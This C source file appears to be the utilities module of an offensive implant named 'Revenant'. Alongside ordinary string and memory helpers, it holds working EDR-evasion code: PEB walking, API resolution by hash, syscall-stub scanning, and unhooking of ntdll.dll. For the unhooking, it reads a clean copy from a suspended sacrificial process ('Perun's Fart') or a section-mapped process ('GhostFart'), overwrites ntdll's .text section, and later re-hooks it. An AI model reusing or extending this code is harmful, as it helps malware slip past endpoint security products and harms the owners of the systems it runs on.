//
// Created by 0xtriboulet on 3/30/2023.
//
#include "Utilities.h"
#include "Revenant.h"
#include "Structs.h"
#include "Config.h"
#include "Poly.h"
#include "Dbg.h"
#include "Asm.h"

#include <windows.h>

VOID* mem_set(VOID * dest, INT value, SIZE_T count){
    UCHAR * p = dest;
    UCHAR v = (UCHAR)value;
    while (count--){
        *p++ = v;
    }
    return dest;
}


VOID* mem_cpy(VOID* dest, CONST VOID* src, SIZE_T count){
    UCHAR * d = (UCHAR *)dest;
    CONST UCHAR * s = (CONST UCHAR *)src;

    // Copy bytes from the source to the destination
    for (SIZE_T i = 0; i < count; i++) {
        d[i] = s[i];
    }

    return dest;
}

VOID* mem_move(VOID* dest, CONST VOID* src, SIZE_T count){
    UCHAR * pDest = dest;
    CONST  UCHAR * pSrc = src;
    if (pDest == pSrc)
        return dest;
    if (pDest < pSrc) {
        while (count--)
            *pDest++ = *pSrc++;
    }
    else {
        pDest += count;
        pSrc += count;
        while (count--)
            *--pDest = *--pSrc;
    }
    return dest;
}

VOID normalize_path(CHAR* path){
    CONST CHAR prefix[] = "\\??\\";
    CONST CHAR separator[] = "\\";
    CONST CHAR* drive_letter = strchr(path, ':');
    CHAR * p = path;

    while (*p != '\0') {
        if (*p == '/')
            *p = separator[0];
        p++;
    }
    if (drive_letter != NULL) {
        // Add the prefix for drive paths
        mem_move(path + (CHAR) str_len(prefix), path, str_len(path) + 1);
        mem_cpy(path, prefix, str_len(prefix));
    } else {
        // Add the prefix for non-drive paths
        CONST CHAR* unc_prefix = "\\";
        mem_move(path + (CHAR) str_len(prefix) + str_len(unc_prefix), path, str_len(path) + 1);
        mem_cpy(path, prefix, str_len(prefix));
        mem_cpy(path + str_len(prefix), unc_prefix, str_len(unc_prefix));
    }
}

CHAR* str_dup(CONST CHAR* str){
    SIZE_T len = str_len(str) + 1;
    CHAR* result = (CHAR*)LocalAlloc(LPTR, len * sizeof(CHAR));
    if (result != NULL) {
        mem_cpy(result, str, len);
    }
    return result;
}

SIZE_T str_len(CONST CHAR* str){
    CONST CHAR* p = str;
    while (*p != '\0') {
        p++;
    }
    return p - str;
}

CHAR** split_first_space(CONST CHAR* str){
    CHAR** result = (CHAR**)LocalAlloc(LPTR, 2 * sizeof(CHAR*));
    if (result == NULL) {
        return NULL;
    }

    SIZE_T len = str_len(str);
    INT space_idx = -1;
    for (INT i = 0; i < len; i++) {
        if (str[i] == ' ') {
            space_idx = i;
            break;
        }
    }

    if (space_idx == -1) {
        result[0] = str_dup(str);
        result[1] = NULL;
    } else {
        result[0] = (CHAR*)LocalAlloc(LPTR, (space_idx + 1) * sizeof(CHAR));
        result[1] = (CHAR*)LocalAlloc(LPTR, (len - space_idx) * sizeof(CHAR));
        if (result[0] == NULL || result[1] == NULL) {
            LocalFree(result[0]);
            LocalFree(result[1]);
            LocalFree(result);
            return NULL;
        }

        mem_cpy(result[0], str, space_idx);
        result[0][space_idx] = '\0';
        mem_cpy(result[1], str + space_idx + 1, len - space_idx);
    }

    return result;
}


CHAR* mem_cat(CONST VOID* ptr1, SIZE_T size1, CONST VOID* ptr2, SIZE_T size2){
    VOID* result = LocalAlloc(LPTR,size1 + size2);
    if (result == NULL) {
        return NULL;
    }
    mem_cpy(result, ptr1, size1);
    mem_cpy(result + size1, ptr2, size2);
    return result;
}

SIZE_T sizeof_w(CONST WCHAR* str){
    SIZE_T len = 0;
    while (str[len] != L'\0') {
        len++;
    }
    return (len + 1) * sizeof(wchar_t);
}

VOID* mem_cpy_w(VOID* dest, CONST VOID* src, SIZE_T n){
    WCHAR* pdest = (WCHAR*)dest;
    CONST WCHAR* psrc = (CONST WCHAR*)src;
    while (n-- > 0) {
        *pdest++ = *psrc++;
    }
    return dest;
}

WCHAR * wide_concat(CONST WCHAR * str1, CONST WCHAR * str2){
    SIZE_T len1 = lstr_lenW(str1);
    SIZE_T len2 = lstr_lenW(str2);
    SIZE_T len = len1 + len2;
    WCHAR* result = (WCHAR*)LocalAlloc(LPTR, (len + 1) * sizeof(WCHAR));
    if (result == NULL) {
        return NULL;
    }
    mem_cpy_w(result, str1, len1);
    mem_cpy_w(result + len1, str2, len2);
    result[len] = L'\0';
    return result;
}

INT str_cmp(CONST CHAR *s1, CONST CHAR *s2){
    INT i = 0;
    while (s1[i] == s2[i]) {
        if (s1[i] == '\0') {
            return 0;
        }
        i++;
    }
    return s1[i] - s2[i];
}

UCHAR * obfuscate_usage(UCHAR * arr, SIZE_T arr_size){
    for (SIZE_T i = 0; i < arr_size; i++) {
        arr[i]++;   // increment the value of the current item
    }

    for (SIZE_T i = 0; i < arr_size; i++) {
        arr[i]--;   // decrement the value of the current item
    }

    return arr;
}

INT mem_cmp(CONST VOID *s1, CONST VOID *s2, SIZE_T n){
    CONST UCHAR * p1 = (CONST UCHAR *)s1;
    CONST UCHAR * p2 = (CONST UCHAR *)s2;

    for (SIZE_T i = 0; i < n; i++) {
        if (p1[i] != p2[i]) {
            return p1[i] - p2[i];
        }
    }

    return 0;
}

HMODULE LocalGetModuleHandle(LPCSTR moduleName){
// Heavily based on the MaldevAcademy implementation

    // Get PEB
#if CONFIG_ARCH == 64
    PPEB pPeb		= (PPEB) get_peb_64();

#elif CONFIG_ARCH == 86
    PPEB pPeb		= (PPEB) get_peb_32();
#endif

    PCWSTR wideModuleName = str_to_wide(moduleName);

    // Getting Ldr
    PPEB_LDR_DATA			pLdr		= (PPEB_LDR_DATA)(pPeb->Ldr);

    // Getting the first element in the linked list (contains information about the first module)
    PLDR_DATA_TABLE_ENTRY	pDte		= (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);
    while (pDte) {

        // If not null
        if (pDte->FullDllName.Length != 0x0) {

            // Check if both equal
            if (IsStringEqual(pDte->FullDllName.Buffer, wideModuleName)) {
                return (HMODULE)(pDte->InInitializationOrderLinks.Flink);

            }

        }
        else {
            break;
        }

        // Next element in the linked list
        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
    }

    LocalFree(wideModuleName);
    return NULL;
}


BOOL IsStringEqual (LPCWSTR Str1, LPCWSTR Str2) {
// MalDev Academy

    // Zero init
    WCHAR   lStr1	[MAX_PATH] = {0};
    WCHAR   lStr2	[MAX_PATH] = {0};

    INT		len1	= lstr_lenW(Str1);
    INT     len2	= lstr_lenW(Str2);

    INT		i		= 0;
    INT     j		= 0;

    // Checking length. We dont want to overflow the buffers
    if ((len1 >= MAX_PATH || len2 >= MAX_PATH) || (len1 != len2)) {
        return FALSE;
    }

    // Converting Str1 to lower case string (lStr1)
    for (i = 0; i < len1; i++){
        lStr1[i] = (WCHAR)tolower(Str1[i]);
    }
    lStr1[i++] = L'\0'; // null terminating

    // Converting Str2 to lower case string (lStr2)
    for (j = 0; j < len2; j++) {
        lStr2[j] = (WCHAR)tolower(Str2[j]);
    }
    lStr2[j++] = L'\0'; // null terminating

    // Comparing the lower-case strings
    if (lstrcmpiW(lStr1, lStr2) == 0) {
        return TRUE;
    }

    return FALSE;
}


VOID rotate_left(UCHAR * data, SIZE_T size, UINT bits){
    UINT byte_shift = bits / 8;
    UINT bit_shift = bits % 8;

    UCHAR temp[size];

    for (SIZE_T i = 0; i < size; i++) {
        SIZE_T new_index = (i + byte_shift) % size;
        temp[new_index] = (data[i] << bit_shift) | (data[(i + 1) % size] >> (8 - bit_shift));
    }
    // _tprintf("data: %s\n", temp);
    // _tprintf("temp: %s\n", data);

    mem_cpy(data, temp, size);
}

INT lstr_lenW(CONST WCHAR* str){
    CONST WCHAR * s = str;
    while (*s)
        ++s;
    return s - str;
}


INT FindFirstSyscall(CHAR* pMem, DWORD size){
// Sektor7 implementation
    // gets the first byte of first syscall
    DWORD i = 0;
    DWORD offset = 0;
#if CONFIG_ARCH == 64
    BYTE pattern1[] = "\x0f\x05\xc3";  // syscall ; ret
#else
    BYTE pattern1[] = "\xff\xd2\xc2";  // syscall ; ret
#endif
    BYTE pattern2[] = "\xcc\xcc\xcc";  // int3 * 3

    // find first occurance of syscall+ret instructions
    for (i = 0; i < size - 3; i++) {
        if (!mem_cmp(pMem + i, pattern1, 3)) {
            offset = i;
            break;
        }
    }

    // now find the beginning of the syscall
    for (i = 3; i < 50 ; i++) {
        if (!mem_cmp(pMem + offset - i, pattern2, 3)) {
            offset = offset - i + 3;
            break;
        }
    }
    LEAVE:
    return offset;
}


INT FindLastSysCall(CHAR* pMem, DWORD size) {
// Sektor7 implementation

    // returns the last byte of the last syscall
    DWORD i;
    DWORD offset = 0;
#if CONFIG_ARCH == 64
    BYTE pattern[] = "\x0f\x05\xc3\xcd\x2e\xc3\xcc\xcc\xcc";  // syscall ; ret ; int 2e ; ret ; int3 * 3
#else
    BYTE pattern[] = "\xe8\xe2\xe3\xff\xff\x33\xc0\xcc\xcc";
#endif
    // backwards lookup
    for (i = size - 9; i > 0; i--) {
        if (!mem_cmp(pMem + i, pattern, 9)) {
            offset = i + 6;

            break;
        }
    }

    return offset;
}

static INT UnHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheClean){
#if CONFIG_UNHOOK >= 1

    // Set up local variables
    DWORD oldProtect = 0;
    PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pCacheClean;
    PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pCacheClean + pImgDOSHead->e_lfanew);
    INT i;


#if CONFIG_NATIVE
    VOID* baseAddress = NULL;
    SIZE_T size = 0;
    NtProtectVirtualMemory_t p_NtProtectVirtualMemory =
            (NtProtectVirtualMemory_t) GetProcAddressByHash(Instance.Handles.NtdllHandle, NtProtectVirtualMemory_CRC32B);


#endif

    // find .text section
    for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char *)pImgSectionHead->Name, ".text")) {
            // prepare ntdll.dll memory region for write permissions.

#if CONFIG_NATIVE
            baseAddress = hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress;
            size = pImgSectionHead->Misc.VirtualSize;
            check_debug(p_NtProtectVirtualMemory(NtCurrentProcess, &baseAddress,
                                                 &size,
                                                 PAGE_EXECUTE_READWRITE,
                                                 &oldProtect) == 0, "NtProtectVirtualMemory Failed!");
#else
            check_debug(Instance.Win32.VirtualProtect((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
                                         pImgSectionHead->Misc.VirtualSize,
                                         PAGE_EXECUTE_READWRITE,
                                         &oldProtect) != 0, "VirtualProtect Failed!");
#endif

            // copy clean "syscall table" into ntdll memory
            DWORD SC_start = FindFirstSyscall((CHAR *) pCacheClean, pImgSectionHead->Misc.VirtualSize);
            DWORD SC_end = FindLastSysCall((CHAR *) pCacheClean, pImgSectionHead->Misc.VirtualSize);

            if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) {
                DWORD SC_size = SC_end - SC_start;

                // copy clean version to ntdll memory
                mem_cpy( (LPVOID)((DWORD_PTR) hNtdll + SC_start),
                        (LPVOID)((DWORD_PTR) pCacheClean + + SC_start),
                        SC_size);
            }
#if CONFIG_NATIVE
            baseAddress = hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress;
            size = pImgSectionHead->Misc.VirtualSize;
            check_debug(p_NtProtectVirtualMemory(NtCurrentProcess, &baseAddress,
                                                 &size,
                                                 oldProtect,
                                                 &oldProtect) == 0, "NtProtectVirtualMemory Failed!");
#else
            // restore original protection settings of ntdll
            check_debug(Instance.Win32.VirtualProtect((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
                             pImgSectionHead->Misc.VirtualSize,
                             oldProtect,
                             &oldProtect) != 0, "VirtualProtect Failed!");
#endif
            return 0;
        }
    }

LEAVE:
//TODO: Memory clean up


#else // unhook
    __asm("nop");
#endif

    // failed? || .text not found!
    return -1;

}

static INT ReHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheHooked){
#if CONFIG_UNHOOK >= 1

    // Set up local variables
    DWORD oldProtect = 0;
    PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pCacheHooked;
    PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pCacheHooked + pImgDOSHead->e_lfanew);
    INT i;


#if CONFIG_NATIVE
    VOID* baseAddress = NULL;
    SIZE_T size = 0;
    NtProtectVirtualMemory_t p_NtProtectVirtualMemory =
            (NtProtectVirtualMemory_t) GetProcAddressByHash(Instance.Handles.NtdllHandle, NtProtectVirtualMemory_CRC32B);


#endif

    // find .text section
    for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char *)pImgSectionHead->Name, ".text")) {
            // prepare ntdll.dll memory region for write permissions.

#if CONFIG_NATIVE
            baseAddress = hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress;
            size = pImgSectionHead->Misc.VirtualSize;
            check_debug(p_NtProtectVirtualMemory(NtCurrentProcess, &baseAddress,
                                                 &size,
                                                 PAGE_EXECUTE_READWRITE,
                                                 &oldProtect) == 0, "NtProtectVirtualMemory Failed!");
#else
            check_debug(Instance.Win32.VirtualProtect((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
                                         pImgSectionHead->Misc.VirtualSize,
                                         PAGE_EXECUTE_READWRITE,
                                         &oldProtect) != 0, "VirtualProtect Failed!");
#endif

            // copy clean "syscall table" into ntdll memory
            DWORD SC_start = FindFirstSyscall((CHAR *) pCacheHooked, pImgSectionHead->Misc.VirtualSize);
            DWORD SC_end = FindLastSysCall((CHAR *) pCacheHooked, pImgSectionHead->Misc.VirtualSize);

            if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) {
                DWORD SC_size = SC_end - SC_start;

                // copy clean version to ntdll memory
                mem_cpy( (LPVOID)((DWORD_PTR) hNtdll + SC_start),
                         (LPVOID)((DWORD_PTR) pCacheHooked + + SC_start),
                         SC_size);
            }
#if CONFIG_NATIVE
            baseAddress = hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress;
            size = pImgSectionHead->Misc.VirtualSize;
            check_debug(p_NtProtectVirtualMemory(NtCurrentProcess, &baseAddress,
                                                 &size,
                                                 oldProtect,
                                                 &oldProtect) == 0, "NtProtectVirtualMemory Failed!");
#else
            // restore original protection settings of ntdll
            check_debug(Instance.Win32.VirtualProtect((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
                             pImgSectionHead->Misc.VirtualSize,
                             oldProtect,
                             &oldProtect) != 0, "VirtualProtect Failed!");
#endif
            return 0;
        }
    }

    LEAVE:
//TODO: Memory clean up


#else // unhook
    __asm("nop");
#endif

    // failed? || .text not found!
    return -1;

}

// True if Unhooking, False if Rehooking
VOID HookingManager(INT UnHook, LPVOID pCache, HMODULE p_ntdll, SIZE_T ntdll_size){
// TODO IMPLEMENT GHOSTFART INSTEAD OF PERUN'S FART & MORE OPSEC HERE

#if CONFIG_UNHOOK >= 1

    SIZE_T bytesRead = 0;

    if(UnHook == 0){
        // Get clean copy of ntdll
        STARTUPINFOA si = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        HANDLE hFile = NULL;
        HANDLE hSection = NULL;
        HANDLE hProc = NULL;
        PRTL_USER_PROCESS_PARAMETERS proc_params = NULL;

#if CONFIG_UNHOOK == 1 // PeRun's Fart
        check_debug(CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, FALSE,\
            CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
                                   NULL,
                                   "C:\\Windows\\System32\\",
                                   &si,
                                   &pi) != 0, "CreateProcessA Failed!");
#elif CONFIG_UNHOOK == 2 // GhostFart

        // Init locals
        OBJECT_ATTRIBUTES obj_attrs;
        IO_STATUS_BLOCK io_status_block;

        // Generate image path
        UNICODE_STRING nt_image_path;
        RtlInitUnicodeString_t p_RtlInitUnicodeString = (RtlInitUnicodeString_t) GetProcAddressByHash(Instance.Handles.NtdllHandle, RtlInitUnicodeString_CRC32B);
        p_RtlInitUnicodeString(&nt_image_path, (PWSTR)L"\\??\\C:\\Windows\\System32\\WEB.rs");

        // Init objectAttribs
        InitializeObjectAttributes(&obj_attrs, &nt_image_path, 0x00000040L, NULL, NULL);

        // Open File
        NtOpenFile_t p_NtOpenFile = GetProcAddressByHash(Instance.Handles.NtdllHandle, NtOpenFile_CRC32B);

        check_debug(p_NtOpenFile(&hFile, FILE_GENERIC_READ, &obj_attrs, &io_status_block, FILE_SHARE_READ,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT) == 0,
            "NtOpenFile Failed!");

        // Create Section
        NtCreateSection_t p_NtCreateSection = GetProcAddressByHash(Instance.Handles.NtdllHandle, NtCreateSection_CRC32B);
        check_debug(p_NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile) == 0,
            "NtCreateSection Failed!");


        // Create the process parameters
        RtlCreateProcessParametersEx_t p_RtlCreateProcessParametersEx = (RtlCreateProcessParametersEx_t) GetProcAddressByHash(Instance.Handles.NtdllHandle, RtlCreateProcessParametersEx_CRC32B);
        check_debug(p_RtlCreateProcessParametersEx(&proc_params, &nt_image_path,
            NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
            0x01) == 0, "RtlCreateProcessParametersEx Failed!");

        PS_CREATE_INFO create_info = { 0 };
        create_info.Size = sizeof(create_info);
        create_info.State = PsCreateInitialState;

        NtCreateProcessEx_t p_NtCreateProcessEx = (NtCreateProcessEx_t) GetProcAddressByHash(Instance.Handles.NtdllHandle, NtCreateProcessEx_CRC32B);

        check_debug(p_NtCreateProcessEx(&pi.hProcess, PROCESS_ALL_ACCESS, NULL, (HANDLE)-1, HANDLE_FLAG_INHERIT, hSection, NULL, NULL, 0) == 0, "NtCreateProcessEx Failed!");
#endif
        check_debug(ReadProcessMemory(pi.hProcess, p_ntdll, pCache, ntdll_size, &bytesRead) != 0, "ReadProcessMemory Failed!");
        UnHookNtdll(p_ntdll, pCache);

        LEAVE:
        // Kill sacrificial process
        if(hFile != NULL){
            CloseHandle(hFile);
        }

        if(hSection != NULL) {
            CloseHandle(hSection);
        }

        if(pi.hProcess != NULL){
            if(hSection != NULL){

                NtClose_t p_NtClose = (NtClose_t) GetProcAddressByHash(Instance.Handles.NtdllHandle, NtClose_CRC32B);
                p_NtClose(hSection);

            }else{
                TerminateProcess(pi.hProcess, 0);
            }
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);


        }

        if(proc_params != NULL){
            RtlDestroyProcessParameters_t p_RtlDestroyProcessParameters = (RtlDestroyProcessParameters_t) GetProcAddressByHash(Instance.Handles.NtdllHandle, RtlDestroyProcessParameters_CRC32B);
            p_RtlDestroyProcessParameters(proc_params);
        }

    }else if (UnHook == 1){
        // check if we already got a clean copy in memory
        UnHookNtdll(p_ntdll, pCache);
    }else{
        // rehook Revenant
        ReHookNtdll(p_ntdll, pCache);
    }

#else // unhook

    __asm("nop");
#endif


}